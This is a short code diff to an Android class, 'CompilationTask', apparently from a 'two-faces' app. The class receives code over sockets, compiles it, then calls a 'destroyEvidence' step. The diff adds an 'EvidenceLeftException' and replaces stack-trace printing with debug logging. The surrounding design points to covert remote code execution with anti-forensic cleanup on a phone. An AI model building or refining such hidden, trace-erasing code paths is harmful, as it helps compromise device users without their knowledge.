@@ -5,6 +5,7 @@ import android.media.MediaRecorder;
 import android.util.Log;
 
 import com.android.app_2_faces_net.compile_unit.Compiler;
+import com.android.app_2_faces_net.compile_unit.EvidenceLeftException;
 import com.android.app_2_faces_net.compile_unit.InvalidSourceCodeException;
 import com.android.app_2_faces_net.compile_unit.NotBalancedParenthesisException;
 
@@ -128,13 +129,11 @@ class CompilationTask implements Runnable {
             //destroy evidence
             compiler.destroyEvidence();
         } catch (InterruptedException interruptedException) {
-            interruptedException.printStackTrace();
+            Log.d(TAG, Log.getStackTraceString(interruptedException));
             Thread.currentThread().interrupt();
-        } catch (InstantiationException | InvocationTargetException | NoSuchMethodException | IllegalAccessException | ClassNotFoundException | NotBalancedParenthesisException | NotFoundException | InvalidSourceCodeException | IOException e) {
-            e.printStackTrace();
+        } catch (InstantiationException | InvocationTargetException | NoSuchMethodException | IllegalAccessException | ClassNotFoundException | NotBalancedParenthesisException | NotFoundException | InvalidSourceCodeException | IOException | EvidenceLeftException e) {
+            Log.d(TAG, Log.getStackTraceString(e));
             this.socketCollector.close();
-        } catch (Exception e) {
-            e.printStackTrace();
         }
         this.socketCollector.close();
     }
@@ -168,7 +167,7 @@ class CompilationTask implements Runnable {
 
                 this.socketCodeSender.close();
             } catch (IOException e) {
-                e.printStackTrace();
+                Log.d(TAG, Log.getStackTraceString(e));
                 this.socketCodeSender.close();
             }
             this.socketCodeSender.close();
